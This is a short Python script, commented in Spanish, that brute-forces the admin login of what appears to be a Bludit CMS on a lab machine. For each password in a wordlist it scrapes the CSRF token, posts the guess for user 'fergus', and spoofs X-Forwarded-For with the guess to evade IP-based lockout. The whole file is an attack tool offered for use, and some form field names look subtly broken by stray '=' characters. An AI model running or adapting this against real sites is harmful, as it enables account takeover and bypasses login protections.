#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, sys, time, re

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales-Cambiar la "ip"
main_url = "http://10.129.94.35/admin/login"

def bruteForce():

	s = requests.session()

	f = open("dictionary.txt", "r")

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	counter = 1

	for password in f.readlines():
		password = password.strip('\n')

		p1.status("Probando la contraseña [%d/349]: %s" % (counter,password))

		r = s.get(main_url)

		token = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]

		post_data = {
			'tokenCSRF=': token,
			'username=': 'fergus',
			'password=': '%s' % password,
			'save': ''
 		}

		headers = {
			'X-Forwarded-For': '%s' % password
		}

		r = s.post(main_url, data=post_data, headers=headers)

		counter += 1

		if "Username or password incorrect" not in r.text:
			p1.success("La contraseña es ---> %s" % password)
			break

if __name__ == '__main__':

	bruteForce()
